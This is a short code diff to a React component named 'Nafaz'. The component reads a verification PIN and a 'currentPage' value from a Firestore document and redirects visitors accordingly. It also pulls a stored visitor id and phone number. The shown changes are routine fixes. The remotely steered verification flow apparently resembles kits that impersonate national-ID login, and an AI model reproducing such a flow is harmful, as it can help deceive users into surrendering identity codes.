@@ -42,29 +42,27 @@ export default function Nafaz() {
         (docSnapshot: { exists: () => any; data: () => any }) => {
           if (docSnapshot.exists()) {
             const userData = docSnapshot.data()
-            // Assuming the PIN is stored in a field called 'nafaz_pin'
             setVerificationCode(userData.nafaz_pin)
-            
 
-            if (userData.currentPage === '1') {
+            if (userData.currentPage === '1' || userData.currentPage === 1) {
               window.location.href = '/'
+            } else if (userData.currentPage === '2' || userData.currentPage === 2) {
+              window.location.href = '/quote'
             } else if (userData.currentPage === '9999') {
               window.location.href = '/verify-phone'
             }
           } else {
             console.error("User document not found")
           }
-        },
-
+        }
       )
 
-      // Clean up the listener when component unmounts or modal closes
-      return () => unsubscribe()
-      // Get data from localStorage
       if (typeof window !== "undefined") {
         setVisitorId(localStorage.getItem("visitor"))
         setPhone(localStorage.getItem("phoneNumber") || "")
       }
+
+      return () => unsubscribe()
     }
   }, [])
 
